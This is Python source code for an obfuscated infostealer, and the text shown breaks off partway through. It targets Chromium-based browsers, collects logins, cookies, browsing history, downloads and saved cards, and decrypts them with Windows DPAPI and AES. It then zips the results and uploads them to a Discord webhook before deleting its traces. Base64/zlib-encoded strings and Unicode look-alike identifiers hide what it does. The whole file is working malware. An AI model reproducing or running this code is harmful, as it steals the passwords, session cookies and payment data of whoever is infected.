import base64
import json
import os
import shutil
import sqlite3
from pathlib import Path
from zipfile import ZipFile
from Crypto.Cipher import AES
from discord import Embed, File, SyncWebhook
from win32crypt import CryptUnprotectData
__𝗟𝘖𝙂𝙄𝗡𝙎__ = []
__𝘊𝗢𝙊𝙆𝙄𝗘𝙎__ = []
__𝗪𝘌𝘉_𝙃𝗜𝗦𝗧𝙊𝗥𝘠__ = []
__𝘿𝘖𝗪𝘕𝙇𝙊𝘼𝘿𝙎__ = []
__𝘾𝘈𝙍𝘿𝘚__ = []

class Browsers:

    def __init__(self, webhook):
        𝙨𝘦𝘁𝙖𝘵𝘵𝗿(𝘀𝘦𝘭𝘧, 'webhook', 𝗦𝘆𝗻𝗰𝘞𝙚𝘣𝘩𝘰𝗼𝘬.from_url(𝙬𝙚𝗯𝘩𝘰𝙤𝗸))
        𝘾𝗵𝗿𝗼𝘮𝙞𝘂𝙢()
        𝙊𝙥𝗲𝗿𝙖()
        𝘜𝗽𝘭𝙤𝘢𝙙(𝘴𝗲𝗹𝘧.webhook)

class Upload:

    def __init__(self, webhook):
        𝘀𝘦𝘁𝙖𝘵𝙩𝘳(𝘴𝙚𝗹𝘧, 'webhook', 𝙬𝗲𝘣𝘩𝗼𝙤𝗸)
        𝘀𝘦𝘭𝙛.write_files()
        𝘴𝙚𝙡𝙛.send()
        𝘴𝗲𝙡𝗳.clean()

    def write_files(self):
        𝗼𝘀.makedirs(__𝘪𝘮𝙥𝗼𝘳𝘁__('base64').b64decode(__𝙞𝙢𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08\xb4\x05\x00\x0b\xfb\x02\x81')).decode(), exist_ok=True)
        if __𝘓𝗢𝙂𝗜𝗡𝘚__:
            with 𝘰𝗽𝗲𝙣(__𝙞𝗺𝙥𝗼𝗿𝘁__('base64').b64decode(__𝙞𝙢𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08JNr\xb7\xccK\x0c7\xad\xf2\xc9\x0b2Iq\xb4\xb5\x05\x00c\xa1\x07\xbe')).decode(), __𝗶𝙢𝘱𝗼𝘳𝙩__('base64').b64decode(__𝙞𝘮𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝘪𝘮𝗽𝙤𝘳𝘁__('base64').b64decode(__𝘪𝘮𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝘧:
                𝗳.write(__𝗶𝗺𝙥𝘰𝗿𝙩__('base64').b64decode(__𝗶𝘮𝗽𝙤𝘳𝘵__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join((𝘴𝘁𝙧(𝙭) for 𝘅 in __𝙇𝙊𝙂𝗜𝙉𝙎__)))
        if __𝘊𝗢𝙊𝗞𝘐𝗘𝗦__:
            with 𝙤𝘱𝙚𝙣(__𝘪𝘮𝗽𝘰𝗿𝙩__('base64').b64decode(__𝗶𝘮𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08J\x8e4\xb2,K4\xca\xc9I\xae45H\xf5\x08\xb4\x05\x00b\xd3\x07\xc9')).decode(), __𝘪𝗺𝙥𝘰𝘳𝙩__('base64').b64decode(__𝗶𝘮𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝘪𝘮𝘱𝙤𝗿𝙩__('base64').b64decode(__𝘪𝘮𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝙛:
                𝗳.write(__𝗶𝗺𝗽𝙤𝙧𝘁__('base64').b64decode(__𝗶𝗺𝗽𝙤𝗿𝙩__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join((𝘀𝘁𝘳(𝙭) for 𝘹 in __𝘊𝙊𝘖𝗞𝗜𝙀𝘚__)))
        if __𝘞𝙀𝗕_𝘏𝗜𝘚𝘛𝗢𝘙𝘠__:
            with 𝗼𝘱𝗲𝘯(__𝙞𝙢𝘱𝘰𝙧𝘵__('base64').b64decode(__𝘪𝘮𝗽𝘰𝘳𝘵__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08JN1\n\xcb\x8c0\xca(H6\x0e*K\xce\xcb.M\xf1\xc80\x00\x00\x8a\x18\t\xb2')).decode(), __𝗶𝗺𝗽𝗼𝙧𝘵__('base64').b64decode(__𝙞𝘮𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝘪𝙢𝘱𝗼𝗿𝙩__('base64').b64decode(__𝗶𝘮𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝘧:
                𝘧.write(__𝗶𝘮𝗽𝗼𝙧𝙩__('base64').b64decode(__𝙞𝗺𝘱𝗼𝗿𝙩__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join((𝘴𝘵𝙧(𝙭) for 𝘹 in __𝘞𝙀𝘉_𝘏𝗜𝗦𝘛𝘖𝗥𝗬__)))
        if __𝘋𝗢𝙒𝙉𝗟𝙊𝘼𝗗𝗦__:
            with 𝘰𝗽𝙚𝙣(__𝘪𝙢𝙥𝘰𝙧𝙩__('base64').b64decode(__𝘪𝗺𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08J\x8er\xb74N\xca\xad(\x8b\x0c\x0f\xaa\xf2\xc9\x0b2Iq\xb4\xb5\x05\x00\x88\xc9\tM')).decode(), __𝗶𝗺𝘱𝘰𝙧𝘁__('base64').b64decode(__𝗶𝙢𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝙞𝙢𝘱𝘰𝘳𝘁__('base64').b64decode(__𝙞𝗺𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝗳:
                𝗳.write(__𝙞𝙢𝘱𝗼𝗿𝙩__('base64').b64decode(__𝙞𝘮𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join((𝘴𝘁𝙧(𝘹) for 𝘅 in __𝘋𝗢𝙒𝙉𝙇𝗢𝗔𝘿𝗦__)))
        if __𝗖𝘼𝙍𝘿𝗦__:
            with 𝘰𝘱𝘦𝙣(__𝘪𝗺𝙥𝗼𝗿𝘵__('base64').b64decode(__𝘪𝙢𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08J\x8e4r\xab\x8c\xf2\xf0-M\xf1\xc80\x00\x00E\x99\x06\x9a')).decode(), __𝘪𝘮𝙥𝙤𝘳𝘵__('base64').b64decode(__𝙞𝙢𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝙞𝘮𝗽𝗼𝘳𝘁__('base64').b64decode(__𝘪𝗺𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝙛:
                𝘧.write(__𝗶𝘮𝘱𝗼𝘳𝙩__('base64').b64decode(__𝙞𝗺𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join((𝙨𝙩𝘳(𝙭) for 𝙭 in __𝗖𝘼𝗥𝗗𝘚__)))
        with 𝘡𝗶𝗽𝙁𝗶𝗹𝙚(__𝘪𝙢𝙥𝗼𝗿𝙩__('base64').b64decode(__𝗶𝘮𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08,M\xcd\xcd)\x07\x00\x1bA\x04n')).decode(), __𝙞𝘮𝗽𝙤𝘳𝘁__('base64').b64decode(__𝙞𝙢𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode()) as 𝙯𝗶𝗽:
            for 𝙛𝙞𝗹𝘦 in 𝘰𝘴.listdir(__𝙞𝘮𝘱𝗼𝙧𝘵__('base64').b64decode(__𝘪𝙢𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08\xb4\x05\x00\x0b\xfb\x02\x81')).decode()):
                𝘻𝙞𝙥.write(__𝘪𝙢𝗽𝙤𝘳𝘁__('base64').b64decode(__𝗶𝘮𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08JN56\xb0\x05\x00\x19\x8d\x03\xad')).decode().format(𝗳𝘪𝘭𝘦), 𝘧𝙞𝘭𝙚)

    def send(self):
        𝘀𝗲𝙡𝗳.webhook.send(embed=𝗘𝘮𝙗𝙚𝙙(title=__𝗶𝙢𝘱𝘰𝙧𝘵__('base64').b64decode(__𝗶𝗺𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x0b\xcbu3L\xf2\x08\xb4\x05\x00\x0b\x8b\x02s')).decode(), description=__𝙞𝙢𝘱𝗼𝗿𝘁__('base64').b64decode(__𝘪𝘮𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x8btwJ\x07\x00\x03(\x01J')).decode() + __𝘪𝗺𝘱𝘰𝗿𝘵__('base64').b64decode(__𝗶𝗺𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode().join(𝙨𝘦𝙡𝙛.tree(𝗣𝘢𝙩𝙝(__𝗶𝙢𝗽𝗼𝘳𝘁__('base64').b64decode(__𝙞𝗺𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08\xb4\x05\x00\x0b\xfb\x02\x81')).decode()))) + __𝘪𝙢𝘱𝙤𝙧𝙩__('base64').b64decode(__𝙞𝘮𝘱𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x8btwJ\x07\x00\x03(\x01J')).decode()), file=𝙁𝙞𝙡𝗲(__𝗶𝗺𝘱𝘰𝗿𝘵__('base64').b64decode(__𝙞𝗺𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08,M\xcd\xcd)\x07\x00\x1bA\x04n')).decode()))

    def clean(self):
        𝙨𝙝𝘶𝙩𝗶𝗹.rmtree(__𝗶𝘮𝘱𝘰𝙧𝘵__('base64').b64decode(__𝙞𝘮𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08\xb4\x05\x00\x0b\xfb\x02\x81')).decode())
        𝘰𝙨.remove(__𝗶𝘮𝙥𝘰𝘳𝘁__('base64').b64decode(__𝗶𝘮𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xdaK\xc9u3L\xf2\x08,M\xcd\xcd)\x07\x00\x1bA\x04n')).decode())

    def tree(self, path, prefix=__𝗶𝘮𝙥𝗼𝗿𝘵__('base64').b64decode(__𝘪𝗺𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode(), midfix_folder=__𝙞𝙢𝘱𝗼𝙧𝘵__('base64').b64decode(__𝘪𝘮𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xda\xb3\xf0\xd2\x0eI\xcft,\xf1t\xb4\xb5\x05\x00\x16\xfb\x03\x8b')).decode(), midfix_file=__𝘪𝗺𝗽𝘰𝘳𝘵__('base64').b64decode(__𝘪𝙢𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xb3\xf0\xd2\x0e\xc9pv,\xf1t\xb4\xb5\x05\x00\x15\xf9\x03f')).decode()):
        𝙥𝙞𝗽𝘦𝙨 = {__𝙞𝘮𝗽𝘰𝘳𝙩__('base64').b64decode(__𝗶𝘮𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xdaK6v\xca\x884\n\xb5\x05\x00\n\xfa\x02^')).decode(): __𝘪𝙢𝙥𝗼𝘳𝘵__('base64').b64decode(__𝗶𝙢𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\xf3tvL\xf7t\xb4\xb5\x05\x00\nL\x029')).decode(), __𝙞𝘮𝗽𝗼𝙧𝙩__('base64').b64decode(__𝙞𝗺𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x8b\xcc\xf3\xcaH\xca\xf5\xcb\x07\x00\rp\x03\x06')).decode(): __𝙞𝘮𝙥𝘰𝗿𝘵__('base64').b64decode(__𝘪𝘮𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xda3)\x08v\xf6tvL\x07\x00\n\xcf\x02o')).decode(), __𝘪𝙢𝘱𝘰𝙧𝙩__('base64').b64decode(__𝘪𝙢𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKq\x0f\xcb\x01\x00\x03\x81\x01n')).decode(): __𝘪𝘮𝘱𝙤𝙧𝘁__('base64').b64decode(__𝗶𝗺𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xda3)\x08N6)\x08v\x04aOG[[\x00*\xbd\x04\xcf')).decode(), __𝙞𝙢𝙥𝙤𝘳𝘁__('base64').b64decode(__𝘪𝙢𝗽𝙤𝗿𝙩__('zlib').decompress(b'x\xdaKrw\xabJq\xb4\xb5\x05\x00\x0c\x19\x02\x89')).decode(): __𝙞𝙢𝘱𝘰𝗿𝘵__('base64').b64decode(__𝗶𝙢𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda3)\x08\x0e5)\x08v\x04aOG[[\x00*\x07\x04\xc1')).decode()}
        if 𝙥𝙧𝙚𝘧𝙞𝙭 == __𝙞𝘮𝗽𝙤𝘳𝙩__('base64').b64decode(__𝗶𝘮𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
            yield (𝙢𝗶𝘥𝙛𝙞𝙭_𝗳𝘰𝘭𝗱𝙚𝙧 + 𝗽𝗮𝙩𝘩.name)
        𝗰𝙤𝗻𝘁𝙚𝘯𝘁𝘀 = 𝙡𝗶𝘀𝙩(𝙥𝙖𝘁𝙝.iterdir())
        𝘱𝙤𝙞𝗻𝙩𝙚𝗿𝙨 = [𝗽𝙞𝗽𝘦𝘴[__𝘪𝘮𝙥𝙤𝙧𝘵__('base64').b64decode(__𝘪𝙢𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xdaKq\x0f\xcb\x01\x00\x03\x81\x01n')).decode()]] * (𝗹𝗲𝙣(𝘤𝘰𝙣𝘁𝘦𝙣𝙩𝙨) - 𝘪𝘯𝘁.from_bytes(𝙢𝗮𝘱(lambda O, i: 770 - (𝘪𝙣𝘵(𝘖) + 𝗶), 𝘮𝗮𝙥(__𝙞𝘮𝘱𝘰𝘳𝙩__('base64').b64decode(__𝘪𝘮𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝘱(*[𝙞𝘁𝘦𝙧(__𝗶𝘮𝗽𝙤𝗿𝙩__('base64').b64decode(__𝗶𝙢𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\xf3\xab\x8a4\x05\x00\x03\x91\x01W')).decode())] * 3)), 𝗿𝗮𝘯𝗴𝙚(1)), __𝘪𝙢𝘱𝗼𝗿𝙩__('base64').b64decode(__𝗶𝗺𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)) + [𝘱𝘪𝗽𝗲𝘴[__𝙞𝙢𝙥𝙤𝙧𝙩__('base64').b64decode(__𝘪𝙢𝘱𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKrw\xabJq\xb4\xb5\x05\x00\x0c\x19\x02\x89')).decode()]]
        for (𝘱𝙤𝙞𝗻𝘁𝘦𝗿, 𝗽𝙖𝙩𝘩) in 𝘻𝙞𝘱(𝙥𝙤𝘪𝙣𝘁𝘦𝘳𝙨, 𝙘𝙤𝗻𝙩𝙚𝗻𝘁𝙨):
            if 𝘱𝙖𝘵𝗵.is_dir():
                yield __𝘪𝗺𝘱𝗼𝘳𝘁__('base64').b64decode(__𝘪𝗺𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xdaK564O\x8b(\xb1L56H\xf7\xf6(\xb1\xf4t\x8f*Hr\x0f\xab\xf2qv2\xf7\xcf4\xa9\x8c\xca3HO4\xf2,\x00\x00\x008\x0c\xc6')).decode().format(𝙥𝗿𝗲𝙛𝗶𝘹, 𝘱𝘰𝘪𝙣𝘵𝗲𝘳, 𝘮𝙞𝙙𝙛𝙞𝘅_𝘧𝗼𝙡𝗱𝗲𝙧, 𝗽𝙖𝘁𝗵.name, 𝗹𝙚𝘯(𝗹𝙞𝘀𝙩(𝗽𝘢𝘵𝙝.glob(__𝘪𝙢𝙥𝘰𝘳𝘵__('base64').b64decode(__𝙞𝘮𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xda\xf3\xce\xcc/\xf3N\xb7\xb5\x05\x00\r?\x02\xc6')).decode()))), 𝘴𝘂𝘮((𝘧.stat().st_size for 𝙛 in 𝙥𝘢𝘁𝘩.glob(__𝘪𝘮𝙥𝗼𝘳𝘵__('base64').b64decode(__𝙞𝙢𝗽𝗼𝘳𝘁__('zlib').decompress(b'x\xda\xf3\xce\xcc/\xf3N\xb7\xb5\x05\x00\r?\x02\xc6')).decode()) if 𝙛.is_file())) / 𝘪𝗻𝙩.from_bytes(𝘮𝗮𝗽(lambda O, i: 783 - (𝘪𝗻𝘁(𝗢) + 𝘪), 𝘮𝙖𝘱(__𝙞𝘮𝘱𝗼𝘳𝙩__('base64').b64decode(__𝙞𝗺𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝙞𝘱(*[𝙞𝙩𝘦𝙧(__𝗶𝘮𝘱𝙤𝗿𝙩__('base64').b64decode(__𝘪𝙢𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xda\xf3\xabJ\xaf\xf2\xabJ6\x01\x00\x0e:\x03\t')).decode())] * 3)), 𝙧𝙖𝘯𝘨𝗲(2)), __𝗶𝗺𝘱𝗼𝗿𝙩__('base64').b64decode(__𝙞𝘮𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))
                𝙚𝘅𝘁𝘦𝗻𝘴𝗶𝗼𝗻 = 𝗽𝗶𝙥𝗲𝙨[__𝗶𝘮𝙥𝗼𝙧𝘁__('base64').b64decode(__𝙞𝗺𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x8b\xcc\xf3\xcaH\xca\xf5\xcb\x07\x00\rp\x03\x06')).decode()] if 𝗽𝗼𝗶𝘯𝘵𝙚𝙧 == 𝘱𝙞𝙥𝙚𝘀[__𝗶𝘮𝙥𝘰𝙧𝙩__('base64').b64decode(__𝙞𝙢𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xdaKq\x0f\xcb\x01\x00\x03\x81\x01n')).decode()] else 𝙥𝙞𝗽𝘦𝙨[__𝙞𝙢𝘱𝗼𝙧𝘁__('base64').b64decode(__𝗶𝙢𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xdaK6v\xca\x884\n\xb5\x05\x00\n\xfa\x02^')).decode()]
                yield from 𝘀𝘦𝗹𝙛.tree(𝙥𝗮𝘵𝙝, prefix=𝙥𝗿𝙚𝙛𝗶𝘅 + 𝘦𝘹𝘁𝘦𝙣𝘀𝘪𝗼𝙣)
            else:
                yield __𝗶𝙢𝘱𝙤𝗿𝙩__('base64').b64decode(__𝙞𝘮𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xdaK564O\x8b(\xb1L56H\xf7\xf6(6\xf3\xc9\xf2\xcaM\x0bv*\x8a\xcc\xcc\xb6\x05\x00~\x97\t\x1b')).decode().format(𝗽𝘳𝙚𝗳𝙞𝘅, 𝘱𝙤𝗶𝙣𝙩𝗲𝙧, 𝗺𝘪𝘥𝙛𝘪𝙭_𝙛𝗶𝗹𝘦, 𝘱𝘢𝘁𝗵.name, 𝗽𝙖𝘵𝙝.stat().st_size / 𝗶𝙣𝘵.from_bytes(𝗺𝙖𝘱(lambda O, i: 708 - (𝘪𝘯𝘵(𝙊) + 𝗶), 𝙢𝘢𝙥(__𝘪𝘮𝙥𝗼𝗿𝘵__('base64').b64decode(__𝗶𝙢𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝘱(*[𝙞𝘵𝙚𝗿(__𝘪𝗺𝗽𝙤𝗿𝘁__('base64').b64decode(__𝙞𝙢𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xabr4\xf1\xabr\xac\x02\x00\x0b\xfa\x02\xc1')).decode())] * 3)), 𝘳𝘢𝙣𝙜𝙚(2)), __𝙞𝗺𝗽𝘰𝗿𝙩__('base64').b64decode(__𝙞𝘮𝗽𝙤𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))

class Chromium:

    def __init__(self):
        𝙨𝘦𝘵𝘢𝙩𝘵𝗿(𝘀𝘦𝗹𝗳, 'appdata', 𝙤𝘀.getenv(__𝘪𝘮𝗽𝙤𝘳𝙩__('base64').b64decode(__𝗶𝘮𝙥𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x0bq\xb5t\t\x0c\xadp\nusr\r\x0c\x0br\x02\x00)\x05\x04\xd4')).decode()))
        𝘀𝗲𝙩𝙖𝘁𝙩𝙧(𝘴𝗲𝘭𝘧, 'browsers', {__𝙞𝘮𝗽𝙤𝙧𝘵__('base64').b64decode(__𝙞𝗺𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x8b\x0c7,\x882\xb2\xb0\x05\x00\x0b2\x02S')).decode(): 𝙨𝘦𝘭𝘧.appdata + __𝙞𝙢𝗽𝙤𝗿𝙩__('base64').b64decode(__𝘪𝗺𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x8bpu+I\x0cO)\x8bp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00h\x16\x07\xed')).decode(), __𝘪𝙢𝗽𝙤𝘳𝘁__('base64').b64decode(__𝙞𝙢𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xdaKq\xb7\xac\x8c4J\xb7\x05\x00\x0b\xd1\x02\x8d')).decode(): 𝘀𝗲𝘭𝘧.appdata + __𝙞𝙢𝘱𝘰𝙧𝘵__('base64').b64decode(__𝗶𝘮𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x8bp\x0b*K\xce\xf5\xcb\x8fp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00i&\x07\xf7')).decode(), __𝘪𝙢𝗽𝘰𝗿𝘵__('base64').b64decode(__𝙞𝘮𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xdaK4\xb2,\x89\x8a\x08\xca\x00\x00\x0b\x84\x02\xad')).decode(): 𝙨𝗲𝙡𝘧.appdata + __𝗶𝙢𝘱𝙤𝘳𝘁__('base64').b64decode(__𝗶𝗺𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x8bp-)K\n\x0f3\x88\x0c\xab\x08K6\n\xab\xf4t\r\xcaHqw\xb5\x05\x00h\xc4\x08\x1d')).decode(), __𝘪𝗺𝘱𝗼𝙧𝘁__('base64').b64decode(__𝘪𝘮𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xdaK2\xf6\xcaL\x8c\x082L\n\xb4\xb5\x05\x00\x18\xed\x03\xb2')).decode(): 𝘀𝙚𝙡𝗳.appdata + __𝘪𝗺𝙥𝙤𝙧𝘵__('base64').b64decode(__𝗶𝘮𝘱𝗼𝙧𝘁__('zlib').decompress(b"x\xda\x8bp\xb5\xac\x8c\xcc\xcd1H\t7L\x0e\x8b\xf0\xcbI\xcetr\x8d\x8c\x08\xca\x00\x00e;\x08'")).decode(), __𝙞𝘮𝘱𝙤𝘳𝙩__('base64').b64decode(__𝙞𝗺𝙥𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x8b4\n+Mq6\xccL\xce\xb54N6\n\xab\x04\x00,\x0e\x058')).decode(): 𝙨𝙚𝙡𝘧.appdata + __𝘪𝘮𝙥𝘰𝘳𝙩__('base64').b64decode(__𝗶𝘮𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x8bp\xf5\xcbI\xca\x0brN\xce\xb54N6\n\xab\x8cp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00\xb0\xd7\n`')).decode(), __𝙞𝘮𝙥𝘰𝙧𝘁__('base64').b64decode(__𝙞𝘮𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xda\xf33\xf63\x88\x8c\xf0\xb4\x05\x00\t\xdc\x027')).decode(): 𝘀𝘦𝙡𝗳.appdata + __𝙞𝘮𝗽𝘰𝗿𝘁__('base64').b64decode(__𝙞𝙢𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x8bpI\tIqw\xab\x8c\x80\xd1naUQ\x11\x9e\xe9A\xeen\x06\x91\x81\xb6\xb6\x00\xb2\xf0\n\x80')).decode(), __𝙞𝘮𝘱𝘰𝘳𝘵__('base64').b64decode(__𝗶𝗺𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xdaK6v2Lq7-H,\xb7\xb5\x05\x00\x17M\x03\xac')).decode(): 𝘴𝘦𝗹𝘧.appdata + __𝘪𝗺𝙥𝘰𝙧𝘁__('base64').b64decode(__𝘪𝙢𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x8bp\xf3+O\x89\x08*M\x0c/I\x0e5v2Lq7-H4\xac\x08K6\n\xab\xf4t\r\xcaHqw\xb5\x05\x00\xe3\x16\x0b\xfa')).decode(), __𝘪𝙢𝗽𝗼𝙧𝘁__('base64').b64decode(__𝗶𝙢𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xdaK\xc9\xcd1\x8a\x0c\xaf\xc8N\x0c\xb4\xb5\x05\x00\x1c\xa3\x04/')).decode(): 𝘴𝗲𝙡𝘧.appdata + __𝘪𝘮𝘱𝘰𝗿𝘁__('base64').b64decode(__𝗶𝘮𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x8bp\x8b*H\xc9u+\x8er\xcfI\x0e\x8b\xf0\xcbI\xcetr\x8d\x8c\x08\xca\x00\x00k\xb8\x08\x89')).decode(), __𝗶𝙢𝗽𝙤𝘳𝘁__('base64').b64decode(__𝙞𝙢𝗽𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x8b2\xb2,\x8b2\xaa\xc8\xf1\t\xf7\xcbO\xce\xb5,\x89\n6\xacJ\xf5\xf0\xb5\x05\x00e5\x08\x18')).decode(): 𝙨𝗲𝙡𝙛.appdata + __𝙞𝘮𝙥𝗼𝗿𝘵__('base64').b64decode(__𝗶𝘮𝘱𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x8bpM)K2J)\x8e\n\xabpI\xf4\xf0*K\n\x0fM\x0f5\xce\x08\x89p\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00\x1e\xf4\rt')).decode(), __𝗶𝙢𝙥𝗼𝙧𝘵__('base64').b64decode(__𝘪𝙢𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x8b2\xb2,\x8b2\xaa\xc8\xf1\t\xf7\xcbO\xce\xb5,\x89\n\xb4\xb5\x05\x00FC\x06\xae')).decode(): 𝙨𝙚𝘭𝗳.appdata + __𝘪𝘮𝙥𝘰𝘳𝘵__('base64').b64decode(__𝙞𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x8bpM)K2J)\x8e\n\xabpI\xf4\xf0*K\n\x0fK\x0e\x8b\xf0\xcbI\xcetr\x8d\x8c\x08\xca\x00\x00\xbb\xe6\x0bP')).decode(), __𝗶𝙢𝗽𝙤𝘳𝙩__('base64').b64decode(__𝙞𝗺𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\x8b\x8ap*\x88\xac4,O\xce\xcd1\x8a\x0c\xf73\xf5\t\xf7\xaaL2N\xa9\x8a\x8a\xf0\xb4\x05\x00\x8dK\t\x91')).decode(): 𝘴𝗲𝙡𝘧.appdata + __𝗶𝙢𝘱𝘰𝘳𝘵__('base64').b64decode(__𝙞𝙢𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x8bp\r+O\x0c\xf7M\x0f\xf5\xf0*H\xc9u\xcbJ\rvrN\xce\xb54N6\n\xab\x8cp\x0b\xab\x8a\x8a\xf0L\x0frw3\x88\x0c\xb4\xb5\x05\x00R\xa7\x0e\x8f')).decode(), 